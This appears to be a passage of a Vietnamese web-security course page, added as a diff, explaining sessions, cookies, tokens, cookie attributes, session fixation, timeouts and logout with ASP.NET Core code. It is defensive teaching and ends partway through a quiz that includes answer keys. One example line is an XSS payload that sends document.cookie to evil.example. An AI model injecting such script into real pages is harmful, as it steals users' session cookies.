@@ -1,0 +1,329 @@
+<!doctype html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>M02 · Bài 2.2 · Session, Cookie &amp; session management</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<main class="content">
+
+<div class="page-head">
+  <div class="breadcrumb"><a href="index.html">Lộ trình</a> / <a href="m02-crypto-session-token.html">Module 02</a> / Bài 2.2</div>
+  <h1>Bài 2.2 — Session, Cookie &amp; session management</h1>
+  <p class="lead">Sau khi bạn gõ đúng mật khẩu, làm sao ứng dụng “nhớ” bạn ở các request tiếp theo? Bài này giải thích session, cookie và token khác nhau thế nào, cách cấu hình cookie đăng nhập an toàn, và cách quản lý phiên từ lúc tạo đến lúc logout (session fixation, timeout, remember me).</p>
+  <div class="meta-row">
+    <span class="chip">⏱ ~20 phút</span>
+    <span class="chip">📘 <a href="m02-crypto-session-token.html">Module 02 · Cryptography, Session, Token &amp; HTTP Auth</a></span>
+  </div>
+</div>
+
+<!-- ===================================================== -->
+<h2 id="session-cookie">C. Session, Cookie và Stateful/Stateless <span class="badge must">Must</span></h2>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+HTTP “mất trí nhớ”: mỗi request là một lần gặp mới. <b>Session</b> giống việc gửi áo khoác ở <b>quầy giữ đồ</b>: quầy giữ áo (trạng thái ở server), bạn cầm <b>tấm thẻ số</b> (session ID). <b>Cookie</b> là cái <b>túi áo</b> trình duyệt dùng để cất tấm thẻ đó và tự động đưa ra mỗi lần quay lại quầy.</div>
+
+<div class="terms"><span class="terms-title">📖 Thuật ngữ trong bài</span><dl>
+<dt>Session (phiên)</dt><dd>Trạng thái “ai đang đăng nhập, từ lúc nào” mà ứng dụng ghi nhớ giữa các request.</dd>
+<dt>Session ID</dt><dd>Mã ngẫu nhiên, như số trên thẻ giữ đồ, dùng để tra ra session ở server.</dd>
+<dt>Cookie</dt><dd>Mẩu dữ liệu nhỏ trình duyệt cất giữ và <b>tự động</b> gửi lại cho đúng website.</dd>
+<dt>Token</dt><dd>Chuỗi “vé” mà client tự đính vào request (thường ở header <code>Authorization</code>) để chứng minh đã được cấp quyền.</dd>
+<dt>Stateful / Stateless</dt><dd>Server có lưu trạng thái phiên (stateful) hay request tự mang đủ thông tin (stateless).</dd>
+<dt>CSRF</dt><dd>Trang độc hại lợi dụng việc trình duyệt tự gửi cookie để thực hiện hành động thay bạn.</dd>
+<dt>XSS</dt><dd>Kẻ tấn công chèn được JavaScript vào trang của bạn và chạy nó trên trình duyệt nạn nhân.</dd>
+<dt>Idle / Absolute timeout</dt><dd>Hết hạn khi ngồi im quá lâu / hết hạn sau thời gian tối đa dù vẫn đang dùng.</dd>
+</dl></div>
+
+<h3 id="cookie-vs-session">Cookie ≠ Session</h3>
+<p>Ba từ “session”, “cookie”, “token” hay bị dùng lẫn lộn. Thật ra chúng trả lời ba câu hỏi khác nhau: <b>trạng thái ở đâu?</b> (session), <b>trình duyệt cất và gửi nó bằng cách nào?</b> (cookie), <b>client tự mang “vé” gì?</b> (token).</p>
+<div class="compare"><span class="compare-title">Phân biệt dễ nhầm: Session vs Session ID vs Cookie vs Token</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Session</th><th>Session ID</th><th>Cookie</th><th>Token (vd. access token)</th></tr></thead>
+<tbody>
+<tr><td>Là gì</td><td>Trạng thái đăng nhập/hoạt động mà ứng dụng quản lý (ai đang đăng nhập, từ lúc nào, giỏ hàng…)</td><td>Giá trị ngẫu nhiên dùng để <b>tham chiếu</b> tới session ở server</td><td>Cơ chế của trình duyệt để <b>lưu và tự động gửi</b> dữ liệu nhỏ theo domain/path và chính sách cookie</td><td>Chuỗi do Authorization Server phát, chứa (hoặc trỏ tới) thông tin quyền</td></tr>
+<tr><td>Nằm ở đâu</td><td>Thường ở server (memory, Redis, DB) — hoặc được đóng gói mã hóa trong cookie</td><td>Thường gửi qua cookie</td><td>Trình duyệt (header <code>Set-Cookie</code> ↓, <code>Cookie</code> ↑)</td><td>Client giữ; gửi trong header <code>Authorization: Bearer …</code></td></tr>
+<tr><td>Ai gửi đi?</td><td>— (không đi trên mạng)</td><td>Trình duyệt, nhờ cookie</td><td>Trình duyệt <b>tự động</b></td><td>Code của client <b>chủ động</b> đính vào</td></tr>
+<tr><td>Trong Kaopiz HR</td><td>Bản ghi “user=57 (An), login lúc 08:00” trong Redis của hr-web</td><td><code>7f3kQx9…b2</code></td><td><code>__Host-hr_sid=7f3kQx9…b2</code></td><td>Access token Keycloak cấp, client gửi cho hr-api</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Cookie <code>hr_lang=vi</code> của hr-web là cookie nhưng <b>không</b> liên quan gì đến session — nó chỉ nhớ ngôn ngữ. Ngược lại, payroll-batch gọi hr-api bằng token mà không có cookie hay session nào. (Token cũng <i>có thể</i> cất trong cookie — xem <a href="m06-5-password-token-storage.html#token-storage">M06</a>.)</p>
+<span class="rule">Session là “áo khoác ở quầy”, session ID là “số thẻ”, cookie là “túi áo đựng thẻ”, token là “vé tự cầm theo người”.</span>
+</div>
+<ul>
+<li>Session cũng không bắt buộc dùng cookie (có thể truyền qua header), nhưng với web app trên trình duyệt, cookie là cách phổ biến và an toàn nhất khi cấu hình đúng.</li>
+<li>Vì trình duyệt <b>tự động gửi cookie</b> theo quy tắc, một trang độc hại có thể khiến trình duyệt gửi request kèm cookie của bạn → nguồn gốc của <b>CSRF</b> (Cross-Site Request Forgery), xem <a href="m06-3-web-threats.html#csrf">M06</a>.</li>
+</ul>
+<p class="myth-head">⚠️ Hiểu lầm hay gặp</p>
+<div class="myth"><span class="m-label">Hiểu lầm</span><span>Cookie chính là session.</span><span class="f-label">Thực tế</span><span>Cookie là cơ chế lưu/gửi của trình duyệt; session là trạng thái ứng dụng quản lý. Session ID chỉ là một cách dùng cookie — <code>hr_lang=vi</code> là cookie nhưng không phải session.</span></div>
+
+<h3 id="stateful-stateless">Stateful vs Stateless</h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+<b>Stateful</b> giống thẻ thành viên phòng gym chỉ in mỗi <b>số thẻ</b>: lễ tân phải tra máy tính xem thẻ còn hạn không. <b>Stateless</b> giống <b>vé xem phim</b> in sẵn ghế, giờ chiếu và có tem chống giả: soát vé nhìn là biết, không cần tra ở đâu — nhưng vé đã phát thì khó “thu hồi” trước giờ chiếu.</div>
+<div class="compare"><span class="compare-title">Phân biệt dễ nhầm: Stateful vs Stateless</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Stateful</th><th>Stateless</th></tr></thead>
+<tbody>
+<tr><td>Trạng thái phiên ở đâu</td><td>Server lưu (Redis, DB, memory)</td><td>Nằm trong chính request — được bảo vệ bằng chữ ký hoặc mã hóa (JWT ký, cookie chứa ticket mã hóa)</td></tr>
+<tr><td>Thu hồi (logout, khóa tài khoản)</td><td><b>Tức thì</b> — xóa session là xong</td><td><b>Khó</b> trước khi hết hạn — cần thêm cơ chế (danh sách thu hồi, token ngắn hạn)</td></tr>
+<tr><td>Scale nhiều instance</td><td>Cần store dùng chung (vd. Redis)</td><td>Dễ — instance nào cũng kiểm tra được</td></tr>
+<tr><td>Trong Kaopiz HR</td><td>hr-web lưu session trong Redis</td><td>hr-api verify JWT bằng public key, không tra DB cho mỗi request</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> HR khóa tài khoản của một nhân viên vừa nghỉ việc lúc 10:00. Với hr-web (stateful), xóa session là người đó bị đá ra ngay. Với hr-api (stateless), access token đã phát vẫn dùng được tới khi hết hạn (ví dụ 10:05) — vì vậy access token nên sống ngắn.</p>
+<span class="rule">Stateful: thu hồi dễ, scale khó hơn. Stateless: scale dễ, thu hồi khó.</span>
+</div>
+<p>Lưu ý: “Stateless” <b>không có nghĩa</b> là không có state nào. Hệ thống vẫn cần lưu trạng thái cho refresh token, danh sách thu hồi, đánh giá rủi ro, audit log, policy.</p>
+<p class="myth-head">⚠️ Hiểu lầm hay gặp</p>
+<div class="myth"><span class="m-label">Hiểu lầm</span><span>JWT stateless hiện đại hơn nên luôn tốt hơn session cho web app.</span><span class="f-label">Thực tế</span><span>Đây là đánh đổi, không phải nâng cấp. Web app server-rendered như hr-web dùng session (stateful) thì logout/khóa tài khoản có hiệu lực ngay; JWT hợp với API cần scale và verify cục bộ, nhưng phải chấp nhận khó thu hồi trước <code>exp</code>.</span></div>
+
+<p>Hai sơ đồ dưới cho thấy cùng một việc “An xem bảng lương” theo hai cách. Khi đọc, hãy để ý: <b>mỗi request mang theo cái gì</b>, và <b>server phải tra cứu ở đâu</b>.</p>
+<h4>Login session-based (stateful, web app truyền thống)</h4>
+<div class="diagram">
+<pre class="mermaid">
+sequenceDiagram
+  participant B as Browser
+  participant W as hr-web (server)
+  participant S as Session store (Redis/DB)
+  B->>W: POST /login (username + password)
+  W->>W: Verify password hash
+  W->>S: Tạo session mới: sid=7f3k... user=57, login_at
+  W-->>B: 302 + Set-Cookie: __Host-hr_sid=7f3k...#59; HttpOnly#59; Secure#59; SameSite=Lax
+  B->>W: GET /payroll (Cookie: __Host-hr_sid=7f3k...)
+  W->>S: Tra cứu sid
+  S-->>W: user=57, còn hiệu lực
+  W-->>B: 200 trang bảng lương
+  B->>W: POST /logout
+  W->>S: XÓA session sid=7f3k...
+  W-->>B: Set-Cookie xóa cookie (Max-Age=0)
+</pre>
+<div class="caption">Session-based: cookie chỉ chứa tham chiếu; trạng thái thật ở server → logout/thu hồi có hiệu lực ngay.</div>
+</div>
+
+<h4>Login token-based (API + Bearer token)</h4>
+<div class="diagram">
+<pre class="mermaid">
+sequenceDiagram
+  participant C as Client app (SPA/desktop)
+  participant AS as Keycloak (Authorization Server)
+  participant API as hr-api (Resource Server)
+  C->>AS: Đăng nhập (flow OAuth/OIDC, chi tiết ở M03)
+  AS-->>C: access_token (JWT, 5 phút) + refresh_token
+  C->>API: GET /payroll/57 + Authorization: Bearer eyJ...
+  API->>API: Verify chữ ký bằng public key (JWKS đã cache), iss, aud, exp, scope
+  API-->>C: 200 dữ liệu
+  Note over API: Không tra session cho mỗi request, không gọi AS mỗi lần
+  C->>API: Request sau khi token hết hạn
+  API-->>C: 401 + WWW-Authenticate: Bearer error=invalid_token
+  C->>AS: Dùng refresh_token xin access token mới
+</pre>
+<div class="caption">Token-based: token tự mang claims đã ký → API kiểm tra cục bộ. Đổi lại, token đã phát hành khó thu hồi trước hạn (xem <a href="m02-4-token-lifecycle.html#token-lifecycle">mục F</a>).</div>
+</div>
+
+<h3 id="cookie-attributes">Thuộc tính cookie cần biết</h3>
+<p>Thuộc tính cookie là các “điều kiện” server gắn kèm, quyết định trình duyệt <b>có được gửi cookie hay không</b> trong từng tình huống. Cấu hình sai là nguồn gốc của nhiều lỗ hổng đánh cắp phiên.</p>
+<p>Server đặt cookie bằng header <code>Set-Cookie</code>. Ví dụ thật từ hr-web sau khi An đăng nhập:</p>
+<pre data-title="HTTP response"><code class="language-plaintext">HTTP/1.1 302 Found
+Location: /payroll
+Set-Cookie: __Host-hr_sid=7f3kQx9…b2; Path=/; Secure; HttpOnly; SameSite=Lax
+Set-Cookie: hr_lang=vi; Path=/; Max-Age=31536000; SameSite=Lax</code></pre>
+<p>Ở các request sau, trình duyệt <b>tự động</b> gửi:</p>
+<pre data-title="HTTP request"><code class="language-plaintext">GET /payroll HTTP/1.1
+Host: hr.kaopiz.local
+Cookie: __Host-hr_sid=7f3kQx9…b2; hr_lang=vi</code></pre>
+
+<div class="table-wrap"><table>
+<thead><tr><th>Thuộc tính</th><th>Tác dụng</th><th>Khuyến nghị cho cookie đăng nhập</th></tr></thead>
+<tbody>
+<tr><td><code>HttpOnly</code></td><td>JavaScript <b>không đọc được</b> cookie (<code>document.cookie</code> không thấy). Giảm thiệt hại khi bị XSS (Cross-Site Scripting) đánh cắp cookie.</td><td><b>Luôn bật.</b> Lưu ý: XSS vẫn có thể <i>gửi request</i> thay người dùng — HttpOnly không chống XSS hoàn toàn.</td></tr>
+<tr><td><code>Secure</code></td><td>Chỉ gửi cookie qua HTTPS.</td><td><b>Luôn bật.</b></td></tr>
+<tr><td><code>SameSite</code></td><td>Kiểm soát việc gửi cookie trong request <b>cross-site</b> (từ site khác khởi tạo). Giá trị: <code>Strict</code>, <code>Lax</code>, <code>None</code> — xem bảng dưới.</td><td><code>Lax</code> (cân bằng) hoặc <code>Strict</code>. Luôn đặt <b>tường minh</b>.</td></tr>
+<tr><td><code>Domain</code></td><td>Không đặt → cookie <b>host-only</b> (chỉ gửi cho đúng host đã set). Đặt <code>Domain=kaopiz.local</code> → gửi cho <b>mọi subdomain</b>.</td><td><b>Không đặt</b> nếu không cần chia sẻ — đặt Domain là <i>mở rộng</i> phạm vi, không phải thu hẹp.</td></tr>
+<tr><td><code>Path</code></td><td>Chỉ gửi cookie cho URL bắt đầu bằng path này.</td><td><code>Path=/</code>. Path <b>không phải</b> ranh giới bảo mật giữa các app cùng host.</td></tr>
+<tr><td><code>Expires</code> / <code>Max-Age</code></td><td>Không có → <b>session cookie</b> (mất khi đóng trình duyệt — nhưng tính năng “khôi phục phiên” của trình duyệt có thể giữ lại). Có → <b>persistent cookie</b>. Nếu có cả hai, <code>Max-Age</code> được ưu tiên.</td><td>Cookie đăng nhập thường không persistent, trừ “remember me”. Thời hạn cookie ≠ thời hạn session ở server.</td></tr>
+</tbody></table></div>
+
+<div class="compare"><span class="compare-title">Phân biệt dễ nhầm: HttpOnly vs Secure</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th><code>HttpOnly</code></th><th><code>Secure</code></th></tr></thead>
+<tbody>
+<tr><td>Chặn ai?</td><td><b>JavaScript</b> trên trang (không đọc được qua <code>document.cookie</code>)</td><td><b>Kẻ nghe lén mạng</b> (cookie không bao giờ đi qua HTTP thường)</td></tr>
+<tr><td>Chống loại tấn công</td><td>XSS đánh cắp cookie</td><td>Nghe lén trên Wi-Fi công cộng, man-in-the-middle khi lỡ vào <code>http://</code></td></tr>
+<tr><td>Không chống được</td><td>XSS gửi request thay người dùng; nghe lén mạng</td><td>XSS; CSRF</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Một bình luận chứa <code>&lt;script&gt;fetch('https://evil.example/?c='+document.cookie)&lt;/script&gt;</code> lọt vào trang tin nội bộ của hr-web → nhờ <code>HttpOnly</code>, script chỉ lấy được <code>hr_lang=vi</code>, không lấy được <code>__Host-hr_sid</code>. An lỡ mở <code>http://hr.kaopiz.local</code> ở quán cà phê → nhờ <code>Secure</code>, cookie phiên không bị gửi qua kết nối không mã hóa.</p>
+<span class="rule">HttpOnly: giấu khỏi JavaScript. Secure: giấu khỏi đường truyền không mã hóa. Cookie đăng nhập cần cả hai.</span>
+</div>
+
+<p><b>SameSite</b> cần giải thích kỹ hơn vì có 3 giá trị. Trước hết, “<b>cross-site request</b>” là request tới hr-web nhưng do <b>trang của site khác</b> khởi tạo (ví dụ một trang lừa đảo có form tự POST sang hr-web). “<b>Điều hướng top-level</b>” là khi cả tab chuyển sang trang mới (thanh địa chỉ đổi), khác với iframe, ảnh hay <code>fetch</code> chạy ngầm.</p>
+<div class="compare"><span class="compare-title">Phân biệt dễ nhầm: SameSite Strict vs Lax vs None</span>
+<div class="table-wrap"><table>
+<thead><tr><th>SameSite</th><th>Gửi cookie khi…</th><th>Hệ quả</th></tr></thead>
+<tbody>
+<tr><td><code>Strict</code></td><td>Chỉ request <b>same-site</b>. Kể cả khi người dùng bấm link từ email/site khác sang, cookie <b>không</b> được gửi ở request đầu.</td><td>Chống CSRF mạnh nhất; nhưng người dùng đến từ link ngoài sẽ thấy như “chưa đăng nhập” ở trang đầu tiên.</td></tr>
+<tr><td><code>Lax</code></td><td>Same-site, <b>cộng</b> điều hướng top-level bằng method an toàn (vd. bấm link → GET). <b>Không</b> gửi với POST cross-site, iframe, ảnh, fetch từ site khác.</td><td>Lựa chọn cân bằng cho cookie đăng nhập. Chặn phần lớn CSRF dạng form POST.</td></tr>
+<tr><td><code>None</code></td><td>Mọi ngữ cảnh, kể cả cross-site. <b>Bắt buộc kèm <code>Secure</code></b>, nếu không trình duyệt từ chối.</td><td>Chỉ dùng khi thật sự cần (iframe nhúng, một số flow SSO kiểu POST cross-site). Phải có biện pháp chống CSRF khác.</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ</b> (An đang đăng nhập hr-web): (1) Bấm link <code>https://hr.kaopiz.local/payroll</code> trong webmail → <code>Strict</code>: trang mở ra như chưa đăng nhập; <code>Lax</code>/<code>None</code>: vào bình thường. (2) Trang lừa đảo tự POST form ẩn tới <code>/bank-account</code> → <code>Strict</code>/<code>Lax</code>: không kèm cookie, bị chặn; <code>None</code>: có cookie — đổi được tài khoản nhận lương nếu hr-web không có anti-CSRF token.</p>
+<span class="rule">Strict: chỉ người nhà. Lax: người nhà + khách bấm link vào xem (GET). None: ai cũng được — phải tự canh cửa.</span>
+</div>
+<div class="callout info"><span class="callout-title">ℹ️ “Site” khác “origin”</span>
+<b>Origin</b> = scheme + host + port. <b>Site</b> = scheme + <i>registrable domain</i> (ví dụ <code>kaopiz.com</code>). Vì vậy <code>hr.kaopiz.com</code> và <code>api.kaopiz.com</code> là <b>cross-origin</b> nhưng <b>same-site</b> → SameSite <b>không</b> bảo vệ bạn khỏi một subdomain khác bị chiếm. Nếu không đặt SameSite, các trình duyệt nhân Chromium mặc định coi như <code>Lax</code> (kèm một ngoại lệ tạm thời cho phép POST cross-site top-level với cookie vừa được đặt vài phút), nhưng hành vi giữa các trình duyệt không hoàn toàn đồng nhất → luôn đặt tường minh.</div>
+<div class="callout tip"><span class="callout-title">✅ Cookie prefix (tiền tố tên cookie)</span>
+Tên bắt đầu bằng <code>__Host-</code> buộc trình duyệt chỉ chấp nhận cookie khi có <code>Secure</code>, <code>Path=/</code> và <b>không có</b> <code>Domain</code> → cookie bị “khóa” vào đúng host. <code>__Secure-</code> chỉ yêu cầu <code>Secure</code>. Đây là cách rẻ để chống việc subdomain khác ghi đè cookie đăng nhập.</div>
+
+<pre data-title="Program.cs — cấu hình cookie authentication (ASP.NET Core)"><code class="language-csharp">using Microsoft.AspNetCore.Authentication.Cookies;
+
+builder.Services.AddAuthentication(CookieAuthenticationDefaults.AuthenticationScheme)
+    .AddCookie(o =&gt;
+    {
+        o.Cookie.Name = "__Host-hr_auth";
+        o.Cookie.HttpOnly = true;
+        o.Cookie.SecurePolicy = CookieSecurePolicy.Always;   // Secure
+        o.Cookie.SameSite = SameSiteMode.Lax;
+        o.Cookie.Path = "/";                                 // __Host- yêu cầu Path=/ và không Domain
+        o.ExpireTimeSpan = TimeSpan.FromMinutes(30);         // hết hạn nếu không hoạt động...
+        o.SlidingExpiration = true;                          // ...được gia hạn khi người dùng còn hoạt động (idle timeout)
+        o.LoginPath = "/account/login";
+    });</code></pre>
+<p class="small muted">Lưu ý: cookie authentication mặc định của ASP.NET Core là <b>stateless</b> — cookie chứa “authentication ticket” (gói thông tin người dùng đã đăng nhập) được mã hóa bằng Data Protection, không phải session ID. Muốn thu hồi phía server, có hai cách:</p>
+<ul class="small muted">
+<li>Cấu hình <code>SessionStore</code> (<code>ITicketStore</code>) để ticket nằm ở server, cookie chỉ còn mang khóa tham chiếu (trở về stateful).</li>
+<li>Hoặc kiểm tra security stamp/phiên ở <code>OnValidatePrincipal</code>.</li>
+</ul>
+<p class="myth-head">⚠️ Hiểu lầm hay gặp</p>
+<div class="myth"><span class="m-label">Hiểu lầm</span><span>Cookie đã có <code>HttpOnly</code> thì chống được CSRF.</span><span class="f-label">Thực tế</span><span>HttpOnly chỉ ngăn JavaScript <b>đọc</b> cookie. CSRF không cần đọc cookie — trình duyệt tự gửi nó kèm request do trang độc hại khởi tạo. Chống CSRF dựa vào <code>SameSite</code> và anti-CSRF token.</span></div>
+<div class="myth"><span class="m-label">Hiểu lầm</span><span><code>SameSite=Lax</code> chặn mọi request từ site khác.</span><span class="f-label">Thực tế</span><span>Lax vẫn gửi cookie khi người dùng <b>bấm link</b> (điều hướng top-level bằng GET) từ site khác. Nếu hr-web có endpoint GET làm thay đổi dữ liệu (vd. <code>GET /leave/cancel?id=5</code>), Lax không cứu được — thao tác thay đổi dữ liệu phải dùng POST/PUT/DELETE.</span></div>
+<div class="myth"><span class="m-label">Hiểu lầm</span><span>Đặt <code>Domain=kaopiz.local</code> giúp “khóa” cookie vào công ty mình, an toàn hơn.</span><span class="f-label">Thực tế</span><span>Ngược lại: đặt Domain <b>mở rộng</b> phạm vi — cookie được gửi cho mọi subdomain, kể cả <code>blog.kaopiz.local</code> ít được bảo vệ. Không đặt Domain (host-only, hoặc dùng prefix <code>__Host-</code>) mới là chặt nhất.</span></div>
+
+<!-- ===================================================== -->
+<h2 id="session-management">C.1. Session management <span class="badge should">Should</span></h2>
+<p>Có session rồi, cần quản lý nó an toàn suốt vòng đời: tạo → dùng → nâng quyền → hết hạn → hủy.</p>
+
+<h3 id="session-id">Session ID phải ngẫu nhiên và do framework sinh</h3>
+<ul>
+<li>Session ID phải <b>không đoán được</b>: sinh bằng bộ sinh số ngẫu nhiên an toàn mật mã (CSPRNG), đủ dài (OWASP khuyến nghị tối thiểu 64 bit entropy).</li>
+<li><b>Không tự chế</b> (ví dụ <code>userId + timestamp</code>, GUID tăng dần, MD5(username)) — dùng cơ chế của framework.</li>
+<li>Không đưa session ID lên URL (lộ qua log, lịch sử, header <code>Referer</code>).</li>
+</ul>
+
+<h3 id="session-fixation">Session fixation</h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+Kẻ gian đưa cho bạn một <b>tấm thẻ giữ đồ mà hắn đã chụp ảnh số thẻ</b>. Bạn dùng thẻ đó để gửi áo (đăng nhập). Hắn mang ảnh số thẻ ra quầy và lấy áo của bạn. Cách chống: <b>đổi thẻ mới</b> ngay khi bạn gửi đồ quý (đăng nhập/nâng quyền).</div>
+<div class="diagram">
+<pre class="mermaid">
+sequenceDiagram
+  participant A as Attacker
+  participant V as Victim (An)
+  participant W as Web app (lỗi)
+  A->>W: Mở trang, nhận sid=ABC (chưa đăng nhập)
+  A->>V: Lừa An dùng sid=ABC (link/cookie injection)
+  V->>W: Đăng nhập với Cookie sid=ABC
+  W-->>V: OK, KHÔNG đổi sid, sid=ABC giờ là phiên của An
+  A->>W: Request với Cookie sid=ABC
+  W-->>A: 200, Attacker đang là An
+  Note over W: Cách sửa: sau login thành công cấp sid MỚI và hủy sid cũ
+</pre>
+<div class="caption">Luôn cấp session ID mới sau login thành công và sau khi thay đổi quyền (ví dụ nâng lên admin, bật chế độ sudo).</div>
+</div>
+<p class="myth-head">⚠️ Hiểu lầm hay gặp</p>
+<div class="myth"><span class="m-label">Hiểu lầm</span><span>Session ID đã đủ dài và ngẫu nhiên thì giữ nguyên qua lúc đăng nhập cũng không sao.</span><span class="f-label">Thực tế</span><span>Session fixation không cần <b>đoán</b> session ID — kẻ tấn công đã <b>biết sẵn</b> nó vì chính hắn cài cho nạn nhân. Độ ngẫu nhiên không giúp gì; phải cấp ID mới và hủy ID cũ sau khi đăng nhập/nâng quyền.</span></div>
+
+<h3 id="timeouts">Idle timeout và absolute timeout</h3>
+<div class="compare"><span class="compare-title">Phân biệt dễ nhầm: Idle timeout vs Absolute timeout</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>💤 Idle timeout</th><th>⏳ Absolute timeout</th></tr></thead>
+<tbody>
+<tr><td>Hết hạn khi</td><td><b>Không hoạt động</b> trong X phút (còn hoạt động thì được gia hạn — ASP.NET Core gia hạn khi đã trôi qua quá nửa thời hạn)</td><td>Đạt thời gian <b>tối đa</b> kể từ lúc đăng nhập (ví dụ 8 giờ), <b>dù vẫn đang hoạt động</b></td></tr>
+<tr><td>Chống rủi ro</td><td>Máy bỏ quên không khóa</td><td>Session bị đánh cắp và kẻ trộm cứ dùng liên tục để “giữ ấm” mãi</td></tr>
+<tr><td>Trong ASP.NET Core</td><td><code>ExpireTimeSpan</code> + <code>SlidingExpiration = true</code></td><td>Không có sẵn một tùy chọn — tự kiểm tra thời điểm login (code bên dưới)</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ</b> (hr-web đặt idle 30 phút, absolute 8 giờ): An đăng nhập lúc 08:00, đi họp từ 10:00 đến 11:00 không đụng máy → 10:30 session hết hạn vì <b>idle</b>. Hôm khác An làm liên tục từ 08:00 → đến 16:00 vẫn bị yêu cầu đăng nhập lại vì <b>absolute</b>.</p>
+<span class="rule">Idle: “ngồi im lâu quá thì đăng xuất”. Absolute: “dù chăm chỉ đến mấy, hết ca là đăng xuất”. Nên có cả hai.</span>
+</div>
+<pre data-title="Absolute timeout với cookie auth (ý tưởng)"><code class="language-csharp">// Lúc đăng nhập: ghi lại thời điểm login vào AuthenticationProperties
+var props = new AuthenticationProperties();
+props.Items["login_at"] = DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString();
+await HttpContext.SignInAsync(CookieAuthenticationDefaults.AuthenticationScheme, principal, props);
+
+// Mỗi request: từ chối nếu quá 8 giờ kể từ lúc login (dù sliding vẫn đang gia hạn)
+o.Events.OnValidatePrincipal = async ctx =&gt;
+{
+    if (ctx.Properties.Items.TryGetValue("login_at", out var s) &amp;&amp;
+        DateTimeOffset.UtcNow.ToUnixTimeSeconds() - long.Parse(s!) &gt; 8 * 3600)
+    {
+        ctx.RejectPrincipal();
+        await ctx.HttpContext.SignOutAsync(CookieAuthenticationDefaults.AuthenticationScheme);
+    }
+};</code></pre>
+
+<h3 id="step-up">Re-authentication / step-up authentication</h3>
+<p>Re-authentication là <b>bắt nhập lại mật khẩu</b>; step-up là <b>đòi thêm yếu tố mạnh hơn</b> (ví dụ passkey/MFA). Dùng trước thao tác nhạy cảm như đổi mật khẩu, đổi email, chuyển tiền, xem dữ liệu bí mật — kể cả khi session vẫn còn hạn.</p>
+<p>Lý do: session có thể đã bị đánh cắp, hoặc máy đang bị người khác dùng. Ví dụ: An đã đăng nhập hr-web từ sáng; khi An bấm “Đổi số tài khoản nhận lương”, hr-web vẫn yêu cầu xác nhận lại bằng passkey.</p>
+<p>Với OIDC, app có thể yêu cầu IdP xác thực lại (ví dụ tham số <code>max_age</code>, <code>prompt=login</code>, <code>acr_values</code> — xem <a href="m03-5-oidc.html#oidc">M03</a>).</p>
+
+<h3 id="remember-me">Remember me</h3>
+<ul>
+<li>Dùng <b>persistent token riêng</b> (ngẫu nhiên, lưu hash ở server), có thời hạn, có thể thu hồi từng thiết bị, xoay vòng sau mỗi lần dùng.</li>
+<li><b>Không</b> phải chỉ kéo dài session vô thời hạn hay lưu username/password trong cookie.</li>
+<li>Khi đăng nhập bằng remember-me, nên coi là mức tin cậy thấp hơn: thao tác nhạy cảm vẫn cần step-up.</li>
+</ul>
+
+<h3 id="logout">Logout phải hủy session phía server</h3>
+<ul>
+<li>Chỉ xóa cookie ở trình duyệt là <b>chưa đủ</b>: nếu ai đó đã chép được cookie/session ID, họ vẫn dùng được nếu server chưa hủy. Ví dụ: An bấm Logout, hr-web chỉ gửi <code>Max-Age=0</code> nhưng session <code>7f3kQx9…b2</code> vẫn còn trong Redis → bản cookie bị chép trước đó vẫn đăng nhập được.</li>
+<li>Session stateful: xóa bản ghi session. Cookie stateless (ticket mã hóa): cần server-side store (<code>ITicketStore</code>) hoặc đánh dấu thu hồi (security stamp, “session version”).</li>
+<li>Logout trong SSO còn liên quan phiên ở IdP và các app khác — xem <a href="m03-6-discovery-logout.html#logout">M03 — Logout</a>.</li>
+</ul>
+<p class="myth-head">⚠️ Hiểu lầm hay gặp</p>
+<div class="myth"><span class="m-label">Hiểu lầm</span><span>Đóng trình duyệt là phiên đăng nhập kết thúc, khỏi cần logout.</span><span class="f-label">Thực tế</span><span>Session cookie có thể được giữ lại nhờ tính năng “khôi phục phiên” của trình duyệt, và phía server session vẫn sống tới khi hết timeout. Trên máy dùng chung, hãy bấm Logout để server hủy session.</span></div>
+<div class="callout tip"><span class="callout-title">✅ Tự kiểm tra nhanh</span><ul>
+<li>Cookie <code>hr_lang=vi</code> có phải session không? Vì sao?</li>
+<li>Cookie đăng nhập có <code>HttpOnly</code> nhưng không có <code>Secure</code>. Kẻ tấn công nào vẫn lấy được nó?</li>
+<li>hr-web chỉ cấu hình idle timeout 30 phút. Kẻ đánh cắp session có thể dùng nó bao lâu?</li>
+</ul></div>
+
+<h2 id="quiz-bai">Quiz nhanh — Bài 2.2</h2>
+<div id="quiz"></div>
+
+</main>
+<script>
+window.QUIZ = [
+  { q: "Cookie đăng nhập của hr-web có <code>SameSite=Lax</code>. hr-web có endpoint <code>GET /leave/cancel?id=5</code> hủy đơn nghỉ phép. Một trang ngoài chứa link tới URL này với lời mời “Xem lịch nghỉ lễ”. An (đang đăng nhập) bấm vào. Chuyện gì xảy ra?", tricky: true,
+    options: ["Cookie không được gửi vì request đến từ site khác, đơn không bị hủy", "Cookie được gửi vì đây là điều hướng top-level bằng GET, đơn bị hủy — lỗi nằm ở việc dùng GET cho thao tác thay đổi dữ liệu", "Cookie chỉ được gửi nếu trang ngoài cũng dùng HTTPS", "Cookie không được gửi vì có <code>HttpOnly</code>"],
+    answer: 1,
